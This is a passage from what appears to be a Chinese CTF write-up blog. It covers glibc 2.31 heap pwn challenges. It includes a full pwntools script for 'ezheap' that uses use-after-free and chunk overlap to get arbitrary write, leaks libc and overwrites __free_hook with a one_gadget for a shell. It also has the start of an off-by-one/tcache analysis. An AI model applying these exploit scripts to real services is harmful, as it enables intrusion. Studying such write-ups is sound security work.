data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You can modify your suggestions\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rtld-libc %#x\"</span><span class=\"token operator\">%</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_rtld_global'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libcbase %#x\"</span><span class=\"token operator\">%</span>libcbase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"rtld: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>rtld<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, exithook: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>exit_hook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, sys_a: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sys_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>exit_hook<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">assert</span> index <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x7fffffff</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input new suggestion\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You can modify your suggestions\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input new suggestion\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token operator\">>></span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>原本想过去修改_rtld_global 中的 exit_hook，但是后面发现够不着，而且明明可以直接改 exit 的。</p>\n</blockquote>\n<h2 id=\"ezheap\"><a class=\"markdownIt-Anchor\" href=\"#ezheap\">#</a> ezheap</h2>\n<p>堆 heap, chunk_extend_and_overlapping, use_after_free, free_hook, one_gadget</p>\n<p>libc: 2.31</p>\n<h3 id=\"程序分析\"><a class=\"markdownIt-Anchor\" href=\"#程序分析\">#</a> 程序分析</h3>\n<p>程序中功能选择有创建 <code>add()</code> ，释放 <code>delete()</code> ，显示 <code>show()</code> ，编辑 <code>edit()</code> 。</p>\n<h4 id=\"add函数\"><a class=\"markdownIt-Anchor\" href=\"#add函数\">#</a> add 函数</h4>\n<p>总共可以分配 15 个 chunk，不能覆盖已有 chunk 的地址，且由于释放 chunk 时不清空指针，所以共可以分配 15 次 chunk。</p>\n<p>每次分配中，先分配固定的 0x20 的空间（实际占用 0x30），这里称为 head chunk，其地址放在 notebook 数组中。然后再分配一个对应输入大小的块，称为 real chunk，其大小会储存在 notesize 数组。headchunk 会储存 real chunk 的大小，以及储存 real chunk 的地址 (headchunk+0x18)。</p>\n<h4 id=\"delete函数\"><a class=\"markdownIt-Anchor\" href=\"#delete函数\">#</a> delete 函数</h4>\n<p>这个 delete 函数是个有缺陷的函数。它只会 free 掉对应的 head chunk，而 real chunk 完全不 free 的。也就是只会 free 掉储存在 notebook 数组的地址对应的 chunk。</p>\n<h4 id=\"show函数\"><a class=\"markdownIt-Anchor\" href=\"#show函数\">#</a> show 函数</h4>\n<p>输出 real chunk 的值，也就是先读取 notebook 对应的 head chunk，然后输出 head chunk 中的第 24 个字节开始的地址对应的内容。</p>\n<h4 id=\"edit函数\"><a class=\"markdownIt-Anchor\" href=\"#edit函数\">#</a> edit 函数</h4>\n<p>编辑函数，但是存在检查。</p>\n<p>会检查 head chunk 的储存的 size 与 notesize 储存的是否一致。如果一致，可直接向 head chunk 储存的地址写入内容。</p>\n<h3 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<h4 id=\"任意地址读写\"><a class=\"markdownIt-Anchor\" href=\"#任意地址读写\">#</a> 任意地址读写</h4>\n<p>经典的带有 head chunk 的题。释放两个 headchunk，这时如果请求一个与 headchunk 大小一致的 realchunk，那么 realchunk 会分配到其中一个已经释放的 headchunk 处。这样我们就有办法 free 掉 real chunk 了。</p>\n<p>后续按在堆中出现顺序称呼 headchunk 和 realchunk，如 head0, head1, real0, real1</p>\n<p><img data-src=\"./1.png\" alt=\"1\"></p>\n<p>其次，这样操作后，head0 指向 head2，因此便可以利用 ehad0 修改 head1 的值，保留 size 值不变，修改地址为目标地址，这样就可以利用 head1 配合 edit 函数实现任意地址读写。可以修改如 <code>__free_hook</code>  的值，将其修改为 one_gadget 然后执行 free (0) 实现 getshell。</p>\n<p>这时 head1 还残留着指向 real1 的值，只要将前 0x18 个字节填充了，即可将其泄露。</p>\n<h4 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h4>\n<p>要实现这个目的需要泄露 libc 地址，然后才能计算 <code>__free_hook</code>  和 one_gadget 的地址。而泄露 libc 的方法则是 free 掉一个较大的 chunk，该 chunk 会被放入 unsorted bin，其 fd 和 bk 即为 mainarena+96 的值，可以利用其计算 libc 的基址。利用 UAF 读取该地址。tcache 的大小最大为 0x410，因此释放的 chunk 需要大于该值。</p>\n<p>由于能 free 掉的只有 headchunk，即使创建了一个大 chunk 也 free 不掉。因此可以利用任意地址读写，修改某个 headchunk 的头，使其变为一个大 chunk。大小记得与其他 chunk 对齐。然后释放对应 headchunk，再将其 fd 打印，也就是 mainarena+96 的地址。</p>\n<h3 id=\"步骤-2\"><a class=\"markdownIt-Anchor\" href=\"#步骤-2\">#</a> 步骤</h3>\n<p>先分配 4 次块，第三次分配块的大小为 <code>0x420-0x28-0x10</code> ，目的是让修改后的 0x420 大小的 head2 对齐 head3。然后 free 掉前两个 headchunk，构造任意地址读写。这时填充 head1 泄露堆地址。然后去计算 h2 的真实地址。</p>\n<p>这里懒得一个个构造 head1 了，所以写了个 python 类。传入要修改的地址，通过 head0 写入 head1，然后通过 head1 往目标地址读写。第一次操作修改 head2 的头为 0x421，然后释放 head2 泄露 libc 地址。第二次操作修改 free_hook 为 one_gadget。最后执行一次 free 函数 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29440</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *$rebase(0x1837)')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'write the note: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x420</span><span class=\"token operator\">-</span><span class=\"token number\">0x28</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#free(1)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x17</span><span class=\"token operator\">+</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ab'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>r1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>h0 <span class=\"token operator\">=</span> r1 <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the first chunk is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>h0<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>h2 <span class=\"token operator\">=</span> h0 <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>hc1 <span class=\"token operator\">=</span> headchunk<span class=\"token punctuation\">(</span>h2<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#change h2's size</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x421</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>hc1<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> h2</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mainarena_96 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mainarena_96 <span class=\"token operator\">-</span> <span class=\"token number\">0x1ecbe0</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the libcbase is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>libcbase<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#if offine, libcbase need add 0x30</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">#onegadget = libcbase + 0xe3b01 + 0x30</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>freehook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>   </pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the freehook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>freehook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the one_gadget is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>onegadget<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>hc1<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> freehook</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"god-of-change\"><a class=\"markdownIt-Anchor\" href=\"#god-of-change\">#</a> god of change</h2>\n<p>堆 heap,  tcache dup, off-by-one, malloc_hook, one_gadget</p>\n<p>libc: 2.31</p>\n<h3 id=\"程序分析-2\"><a class=\"markdownIt-Anchor\" href=\"#程序分析-2\">#</a> 程序分析</h3>\n<p>程序中功能选择有创建 <code>add()</code> ，释放 <code>delete()</code> ，显示 <code>show()</code> 。(好像是我自己给程序重命名的)</p>\n<h4 id=\"创建函数\"><a class=\"markdownIt-Anchor\" href=\"#创建函数\">#</a> 创建函数</h4>\n<p>存在很明显的故意的单字节溢出，完全就是怕你看不见。<img data-src=\"./image-20231019210519069.png\" alt=\"image-20231019210519069\"></p>\n<p>其次，限制了 malloc 块的大小，最大为 0x7f。最后，加了两个数组，分别储存分配 chunk 的大小和是否在使用，我分别命名为 chunkSize 和 chunkInuse。</p>\n<p>最多分配 31 次 chunk。</p>\n<h4 id=\"释放函数\"><a class=\"markdownIt-Anchor\" href=\"#释放函数\">#</a> 释放函数</h4>\n<p>不检查 chunkInuse，不清除对应 chunkLIst 的指针，可以 double free。</p>\n<p>会将对应的 chunkSize 和 chunkInuse 置 0。</p>\n<h4 id=\"显示函数\"><a class=\"markdownIt-Anchor\" href=\"#显示函数\">#</a> 显示函数</h4>\n<p>会检查 chunkInuse。</p>\n<h3 id=\"漏洞利用-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用-2\">#</a> 漏洞利用</h3>\n<p>依旧是构造 unsorted bin 泄露 libc 地址。利用 off-by-one 修改相邻的 chunk 的 size，造成 overlapping。然后伪造大 chunk，释放并泄露地址。</p>\n<p>可以利用 tcache dup 进行任意地址读写。高版本对 tcache 